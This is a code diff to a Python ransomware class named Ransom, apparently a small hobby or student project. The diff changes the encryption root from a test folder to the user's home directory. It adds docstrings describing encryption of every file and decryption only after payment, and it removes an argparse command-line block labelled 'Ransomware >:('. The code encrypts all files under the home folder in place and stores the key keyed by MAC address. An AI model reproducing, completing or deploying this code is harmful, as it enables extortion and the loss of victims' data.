@@ -2,7 +2,6 @@
 from cryptography.fernet import Fernet 
 import os
 import getpass
-import argparse
 import socket
 import uuid
 from uuid import getnode as get_mac
@@ -30,15 +29,16 @@ class Ransom:
         self.keyManager = KeyManager()
     
     def getDefaultRoot(self):
-        #path = os.path.abspath('Documents')
-        path = os.path.expanduser("~")#+'/Documents'
-        print(path)
-        #parts = path.split('/')
-        #path = '/'.join(parts[:-1])
-        #path+='/testDIr/'
+        """
+            Returns the base folder where the encryption starts
+        """
+        path = os.path.expanduser("~")
         return path
 
     def encrypt(self):
+        """
+            Encrypts alla the documents inside the specified basefolder and all its subfolders
+        """
         for root, dirs, files in os.walk(self.root):
             for file in files:
                 filePath = os.path.join(root, file)
@@ -53,6 +53,9 @@ class Ransom:
         self.keyManager.insertKey(get_mac(), self.key)
 
     def encryptFile(self, file):
+        """
+            Encrypts a file
+        """
         with open(file, 'rb+') as f:
             content = f.read()
             encryptedContent = self.fernet.encrypt(content)
@@ -61,17 +64,23 @@ class Ransom:
             f.truncate()
 
     def startDecryption(self):
+        """
+            Start decryption of the computer
+            If no payments hase been made this will raise an error
+        """
         self.key = self.keyManager.getKey(get_mac())
         if self.key == '':
             raise ValueError('The key is empty. Cannot decrypt without a key')
             print('No key') ### TODO díla við þetta
             return 
-        print(self.key)
-        print(len(self.key))
         self.Fernet = Fernet(self.key)
         self.decrypt()
     
     def decrypt(self):
+        """
+            Decrypts all the documents inside the specified basefolder and all its subfolders
+            Note: Since this uses symmetric decryption then encryption and decryption is equivalent
+        """
         for root, dirs, files in os.walk(self.root):
             for file in files:
                 filePath = os.path.join(root, file)
@@ -84,6 +93,9 @@ class Ransom:
             
         
     def decryptFile(self, file):
+        """
+            Encrypts a file
+        """
         with open(file, 'rb+') as f:
             content = f.read()
             print(self.key)
@@ -95,57 +107,5 @@ class Ransom:
             f.write(decryptedContent)
             f.truncate()
     
-"""
-def main():
-    ransom = Ransom()
-    path = os.path.realpath('ransom.py')
-    parts = path.split('/')
-    path = '/'.join(parts[:-1])
-    path+='/testDIr/'
-    print(path)
-    #doc_index = parts.index('Documents')
-    #path = '/'.join(parts[:doc_index+1])
-    #print(path)
-    ransom = Ransom(root = path)
-    ransom.encrypt()
- 
 
-
-
-parser = argparse.ArgumentParser(description='Ransomware >:(')
-parser.add_argument('-e', help="Te key for encryption", action='store_true', dest="enc")
-parser.add_argument('-d', help="The key for encryption", action='store_true',dest="dec")
-parser.add_argument('-k', '--key', help ='Crypto key')
-args = parser.parse_args()
-
-enc = args.enc
-dec = args.dec
-key = args.key
-
-if enc and dec:
-    print('Can not both encrypt and decrypt at the same time.')
-    sys.exit(0)
-
-path = os.path.realpath('ransom.py')
-parts = path.split('/')
-path = '/'.join(parts[:-1])
-path+='/testDIr/'
-print(path)
-if dec:
-    
-    #doc_index = parts.index('Documents')
-    #path = '/'.join(parts[:doc_index+1])
-    #print(path)
-    ransom = Ransom(key = key, root = path)
-    ransom.decrypt()
-
-else: #Encrypt is default
-    ransom = Ransom(key = key, root = path)
-    print(ransom.key)
-    ransom.encrypt()
-
-#if __name__ == '__main__':
-    #main()
-
-"""
         
